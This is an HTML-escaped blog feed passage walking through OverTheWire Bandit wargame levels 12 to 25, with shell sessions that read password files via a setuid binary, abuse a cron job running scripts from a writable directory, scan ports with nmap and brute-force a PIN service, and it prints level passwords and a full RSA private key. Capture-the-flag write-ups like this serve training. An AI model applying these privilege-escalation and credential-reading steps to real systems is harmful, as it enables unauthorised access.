data.txt  data2  data2.bin  data3  data4  data5  data5.bin
bandit12@melinda:/tmp/unl$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@melinda:/tmp/unl$ tar xf data5.bin
bandit12@melinda:/tmp/unl$ ls
data.txt  data2  data2.bin  data3  data4  data5  data5.bin  data6.bin
bandit12@melinda:/tmp/unl$ file data6.bin 
data6.bin: bzip2 compressed data, block size = 900k
bandit12@melinda:/tmp/unl$ bzcat data6.bin &amp;gt; data7
bandit12@melinda:/tmp/unl$ file data7
data7: POSIX tar archive (GNU)
bandit12@melinda:/tmp/unl$ tar xf data7
bandit12@melinda:/tmp/unl$ ls
data.txt  data2  data2.bin  data3  data4  data5  data5.bin  data6.bin  data7  data8.bin
bandit12@melinda:/tmp/unl$ file data8.bin
data8.bin: gzip compressed data, was &amp;quot;data9.bin&amp;quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
bandit12@melinda:/tmp/unl$ cat data8.bin &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; zcat &amp;gt; data9
bandit12@melinda:/tmp/unl$ file data9
data9: ASCII text
bandit12@melinda:/tmp/unl$ cat data9 
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Basically we identify, extract, repeat, until we&amp;rsquo;re at the plain text file with the
password.&lt;/p&gt;

&lt;h1 id=&#34;level-13-14:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 13 -&amp;gt; 14&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit14.html&#34;&gt;Level 13&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We&amp;rsquo;re given a lot of information here, and one of those is that we get the SSH
key for the &lt;code&gt;bandit14&lt;/code&gt; user. We can use this to login as that user without knowing
the password:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit13@melinda:~$ ssh -i ./sshkey.private bandit14@localhost 
Could not create directory &amp;#39;/home/bandit13/.ssh&amp;#39;.
The authenticity of host &amp;#39;localhost (127.0.0.1)&amp;#39; can&amp;#39;t be established.
ECDSA key fingerprint is 05:3a:1c:25:35:0a:ed:2f:cd:87:1c:f6:fe:69:e4:f6.
Are you sure you want to continue connecting (yes/no)? yes
.
.
bandit14@melinda:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;We pass the key as an argument to the ssh command, and connect to the localhost
as bandit14. Then we can read the file with the password.&lt;/p&gt;

&lt;h1 id=&#34;level-14-15:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 14 -&amp;gt; 15&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit15.html&#34;&gt;Level 14&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This level starts introducing some networking and how to interact with remote
hosts. Well, in this case it&amp;rsquo;s localhost, but the principle is the same.
We need to connect to a specific port on localhost and then supply
the current password. I&amp;rsquo;m using &lt;code&gt;netcat&lt;/code&gt; to do this&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit14@melinda:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;All you get is a blank line when you&amp;rsquo;ve connected. The simply paste in the
password you logged in with and hit enter.&lt;/p&gt;

&lt;p&gt;Continues with &lt;a href=&#34;http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part2&#34;&gt;Let&amp;rsquo;s crack Bandit Part 2&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Let&#39;s crack Bandit Part 2</title>
      <link>http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part2/</link>
      <pubDate>Fri, 13 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part2/</guid>
      <description>

&lt;p&gt;Continues on from &lt;a href=&#34;http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1&#34;&gt;Let&amp;rsquo;s crack Bandit Part 1&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-15-16:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 15 -&amp;gt; 16&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit16.html&#34;&gt;Level 15&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Eventhough this is very similar to the previous level, it&amp;rsquo;s a little
more complicated as we need to connect with SSL.
The simplest way is using &lt;code&gt;openssl&lt;/code&gt; with &lt;code&gt;s_client&lt;/code&gt;. Once connected it&amp;rsquo;s the
same dance as above&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit15@melinda:~$ openssl s_client -quiet -connect localhost:30001
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

read:errno=0
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-16-17:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 16 -&amp;gt; 17&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit17.html&#34;&gt;Level 16&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we have a choice. We run a simple ping scan across the port range and then
figure out which port is the right one by trying each one. Depending on the number
of ports open this could take a while or not.
Let&amp;rsquo;s see how we&amp;rsquo;re going to handle this by seeing which ports are open&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit16@melinda:~$ nmap localhost -p 31000-32000 

Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:54 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00080s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Not too bad. Because it&amp;rsquo;s a short list, we can try them one by one, or
we run a service discovery on them. Service discovery in nmap takes a while,
so I only scan the ports we are interseted in:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit16@melinda:~$ nmap -sV -p 31046,31518,31691,31790,31960 localhost

Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:51 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00015s latency).
PORT      STATE SERVICE VERSION
31046/tcp open  echo
31518/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
31691/tcp open  echo
31790/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
31960/tcp open  echo
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we only have two ports to try, as the others are clearly just echo ports.
Eliminating one we go ahead and&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit16@melinda:~$ openssl s_client -quiet -connect localhost:31790
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

read:errno=0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now copy that key into a new file and use &lt;code&gt;chmod go-rw key&lt;/code&gt; to remove group
and other read/write. ssh refuses to accept a key that is read/write by
anyone other than the user who owns the file. Then simply&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit16@melinda:~$ ssh -i /tmp/k.key bandit17@localhost
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-17-18:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 17 -&amp;gt; 18&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit18.html&#34;&gt;Level 17&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We remain logged in as bandit17 from the previous level. To compare two files
we need to do a &lt;code&gt;diff&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit17@melinda:~$ diff passwords.old  passwords.new 
42c42
&amp;lt; BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR
---
&amp;gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The latter output is the entry in the &lt;code&gt;password.new&lt;/code&gt; file, and thus the password
for bandit18.&lt;/p&gt;

&lt;h1 id=&#34;level-18-19:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 18 -&amp;gt; 19&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit19.html&#34;&gt;Level 18&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Oh noes. We get logged out as soon as we log in because some nefarious
individual has been editing our &lt;code&gt;.bashrc&lt;/code&gt; file. Well in that case
we need to launch bash without an rc file.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ssh bandit18@bandit.labs.overthewire.org &amp;#39;/bin/bash --norc&amp;#39;
cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Because we launched without an rc file there&amp;rsquo;s not going to be a prompt.
All we need to do is cat the &lt;code&gt;readme&lt;/code&gt; file and the password is ours.&lt;/p&gt;

&lt;h1 id=&#34;level-19-20:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 19 -&amp;gt; 20&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit20.html&#34;&gt;Level 19&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we learn about setuid binaries. Basically this is a binary that a user can
run, but when executed runs as the setuid user. To explain, long list the file&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit19@melinda:~$ ls -al
total 28
drwxr-xr-x   2 root     root     4096 Nov 14 10:32 .
drwxr-xr-x 167 root     root     4096 Jan 12 17:44 ..
-rw-r--r--   1 root     root      220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root     root     3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root     root      675 Apr  9  2014 .profile
-rwsr-x---   1 bandit20 bandit19 7370 Nov 14 10:32 bandit20-do
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So you see it&amp;rsquo;s owned by &lt;code&gt;bandit20&lt;/code&gt; and the &lt;em&gt;s&lt;/em&gt; bit is set in &lt;code&gt;-rwsr-x---&lt;/code&gt;. That&amp;rsquo;s
how we identify setuid binaries.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s make use of it. This will run any command we supply, as the user &lt;code&gt;bandit20&lt;/code&gt;,
so let&amp;rsquo;s simply print the password&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-20-21:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 20 -&amp;gt; 21&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit21.html&#34;&gt;Level 20&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now we&amp;rsquo;re entering a more complicated example of networking. Not only do we need
to connect to a host, we have to create the host to connect to. Once
&lt;code&gt;suconnect&lt;/code&gt; is connected, we must pass it the password and in return we get the
one for the next level.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s log into a new shell to create our server with &lt;code&gt;netcat&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit20@melinda:~$ nc -vlk 31337
Listening on [0.0.0.0] (family 0, port 31337)
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The option &lt;code&gt;vlk&lt;/code&gt; is &lt;code&gt;verbose&lt;/code&gt;, &lt;code&gt;listen&lt;/code&gt;, and &lt;code&gt;keep-open&lt;/code&gt;. Ok, we&amp;rsquo;re listening
and now, from another terminal, we log into level 20 and execute &lt;code&gt;suconnect&lt;/code&gt;. From
our listening terminal, once we see an established connection, we send the password,
and get our new one back.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;# terminal 2
bandit20@melinda:~$ ./suconnect  31337

# terminal 1
Connection from [127.0.0.1] port 31337 [tcp/*] accepted (family 2, sport 43463)
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-21-22:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 21 -&amp;gt; 22&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit22.html&#34;&gt;Level 21&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;First let&amp;rsquo;s list the crontabs in the directory supplied. Our likely
candidate is &lt;code&gt;/etc/cron.d/cronjob_bandit22&lt;/code&gt; so let&amp;rsquo;s see what it runs
and also what that script contains&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;cat /etc/cron.d/cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&amp;gt; /dev/null
bandit21@melinda:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 &amp;gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So basically it copies the password for the next level into a file in &lt;code&gt;/tmp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit21@melinda:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-22-23:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 22 -&amp;gt; 23&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit22.html&#34;&gt;Level 22&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pretty similar to above but with a different script&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit22@melinda:~$ cat /etc/cron.d/cronjob_bandit23
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;amp;&amp;gt; /dev/null
bandit22@melinda:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d &amp;#39; &amp;#39; -f 1)

echo &amp;quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&amp;quot;

cat /etc/bandit_pass/$myname &amp;gt; /tmp/$mytarget
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;This script takes the string &lt;code&gt;I am user $myname&lt;/code&gt; and hashes it with an md5
then puts the next password into a file in &lt;code&gt;/tmp&lt;/code&gt; with that filename. The easiest
thing to do is to see what the filename will be. It will run as &lt;code&gt;bandit23&lt;/code&gt; so
&lt;code&gt;whoami&lt;/code&gt; will return that string.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit22@melinda:~$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo &lt;/span&gt;I am user bandit23 &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; md5sum &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; cut -d &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt; -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@melinda:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-23-24:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 23 -&amp;gt; 24&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit24.html&#34;&gt;Level 23&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once again&amp;hellip;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit23@melinda:~$ cat /etc/cron.d/cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&amp;gt; /dev/null
bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo &amp;quot;Executing and deleting all scripts in /var/spool/$myname:&amp;quot;
for i in *;
do
    echo &amp;quot;Handling $i&amp;quot;
    ./$i
    rm -f $i
done
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So anything in &lt;code&gt;/var/spool/bandit24&lt;/code&gt; will get run as bandit24. Checking if we
can write to that directory show us&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit23@melinda:~$ ls -la /var/spool/
total 21
drwxr-xr-x  6 root     root     4096 Nov 15 14:55 .
drwxr-xr-x 15 root     root     4096 Nov 14 10:32 ..
drwxrwx---  2 bandit24 bandit23 1024 Mar 20 15:38 bandit24
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;that we can. Excellent. So let&amp;rsquo;s write a script to cat the password to a tmp file.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;!#/bin/bash
cat /etc/bandit_pass/bandit24 &amp;gt; /tmp/unl.pass
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Make it executable, copy it to the right directory and then harvest the key&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit23@melinda:/tmp$ chmod +x t.sh
bandit23@melinda:/tmp$ cp t.sh /var/spool/bandit24/
bandit23@melinda:/tmp$ cat /tmp/unl.pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-24-25:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 24 -&amp;gt; 25&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit25.html&#34;&gt;Level 24&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we need to bruteforce our way to the password. No point entering our
tries by hand, so let&amp;rsquo;s leverage the power of bash. First create a loop
to print the values, so we can be sure the input to the netcat command is
going to be right&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit24@melinda:~$ &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;seq -f &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%04g&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; 9999&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &amp;#39;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;done&lt;/span&gt;
.
.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9856
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9857
.
.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;seems to ne what we want. Let&amp;rsquo;s actually pass it onto the command. Because each
iteration will take a while, we have plenty of time to stop it when it finds the
right answer&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit24@melinda:~$ &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;seq -f &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%04g&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; 9999&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &amp;#39;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; nc localhost 30002&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;done&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;But who wants to sit there watching a screen? A quick Python script and we can
leave it running until it finds the right PIN.
Sometimes you just have to be patient.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;netcat&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(hostname,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;port,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;content):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;socket(socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;AF_INET,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;SOCK_STREAM)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;connect((hostname,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;port))&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sendall(content)&lt;/span&gt;
